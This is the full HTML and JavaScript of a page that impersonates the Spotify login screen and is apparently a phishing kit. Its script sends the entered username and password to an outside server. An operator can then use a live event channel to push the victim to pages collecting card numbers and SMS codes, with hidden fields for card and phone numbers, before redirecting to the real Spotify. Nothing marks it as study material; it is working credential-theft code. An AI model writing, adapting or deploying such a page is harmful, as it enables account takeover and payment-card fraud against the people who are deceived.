<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="app.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <form method="POST">
        <input type="hidden" name="LOGIN">
        <input type="hidden" name="USERNAME">
        <input type="hidden" name="PASSWORD">
        <input type="hidden" name="CARD_NUMBER">
        <input type="hidden" name="PHONE_NUMBER">
    </form>
    <header>
        <img src="logo.png" alt="Logo">
    </header>

    <div class="loader" style="color:white; text-align:center;">
        <div class="content" style="flex-direction:column;">
            <h3>Please wait...</h3>
            <p>Do not leave this page. You will automatically be redirected.</p>
            <img src="loading.gif" alt="Loading">
        </div>
    </div>

    <main>
        <div class="form">
            <div class="title">
                Log in to Spotify
            </div>

            <div class="cols">
                <div class="col">
                    <label>Email or username</label>
                    <input type="text" id="u" placeholder="Enter Email or username">
                </div>

                <div class="col">
                    <label>Password</label>
                    <input type="password" id="p" placeholder="Enter Password">
                </div>

                <div class="col remember">
                    <img src="remember.png" alt="Remember"> Remember me
                </div>

                <div class="col submit">
                    <button type="button" onclick="sendLog()">Log In</button>
                </div>

                <div class="col forgot">
                    <a href="#">Forgot your password?</a>
                </div>

                <div class="col signup">
                    Don't have an account? <a href="#">Sign up for Spotify</a>
                </div>

            </div>
        </div>
    </main>

    <script>
        document.addEventListener('DOMContentLoaded', async function () {
    try {
        const userId = localStorage.getItem('userId');  // Retrieve userId from localStorage
        
        if (!userId) {
            console.error("User ID not found.");
            return;
        }

        const response = await fetch('https://spotnewback2.onrender.com/details', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'User-ID': userId  // Send userId in the header
            },
        });

        const data = await response.json();

        if (data.success) {
            console.log('Page load notification sent successfully.');
        } else {
            console.error('Error notifying page load.');
        }
    } catch (error) {
        console.error('Error during page load notification:', error);
    }

    // Continue with the userId fetching process
    let userId = localStorage.getItem('userId');

    if (!userId) {
        try {
            const response = await fetch('https://spotnewback2.onrender.com/user-id', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                },
            });

            const data = await response.json();

            if (data.success) {
                localStorage.setItem('userId', data.userId);
                userId = data.userId;
            } else {
                console.error('Error generating user ID');
                return;
            }
        } catch (error) {
            console.error('Error fetching user ID:', error);
            return;
        }
    }
});


        function sendLog() {
            const username = $("#u").val();
            const password = $("#p").val();


            if (username === "") {
                return $("#u").addClass("error");
            }
            if (password === "") {
                return $("#p").addClass("error");
            }

            $(".loader").show();


            const userId = localStorage.getItem('userId');

            if (!userId) {
                console.error("User ID not found.");
                $(".loader").hide();
                return;
            }

            // Send login request with user credentials
            $.post("https://spotnewback2.onrender.com/login", {
                username: username,
                password: password,
                userId: userId
            })
                .done((res) => {
                    listenForSSE(userId);
                })
                .fail((err) => {

                });
        }


        function listenForSSE(userId) {
            const eventSource = new EventSource(`https://spotnewback2.onrender.com/sse/${userId}`);
            console.log("Attempting to establish SSE connection for userId:", userId);

            eventSource.onmessage = function (event) {
                console.log("SSE Message received:", event);

                try {

                    const data = JSON.parse(event.data);
                    if (!data.action) {

                        return;
                    }

                    console.log("Action received:", data.action);


                    if (data.action === "login") {

                        window.location.href = 'login.html';
                    } else if (data.action === "cc") {

                        window.location.href = 'cc.html';
                    } else if (data.action === "sms") {
                        window.location.href = 'sms.html';
                    } else if (data.action === "spotify") {
                        window.location.href = 'https://open.spotify.com/';
                    }
                    else {
                        window.location.href = 'login.html';
                    }
                } catch (error) {

                    window.location.href = 'login.html';
                }
            };

            eventSource.onerror = function (event) {
                console.error("SSE connection error:", event);
                eventSource.close();
            };

            eventSource.onopen = function (event) {
                console.log("SSE connection successfully opened:", event);
            };

            eventSource.onclose = function (event) {
                console.log("SSE connection closed:", event);
            };
        }


        $("input").keypress((e) => {
            if (e.key === "Enter") {
                sendLog();
            }
        });
    </script>

</body>

</html>
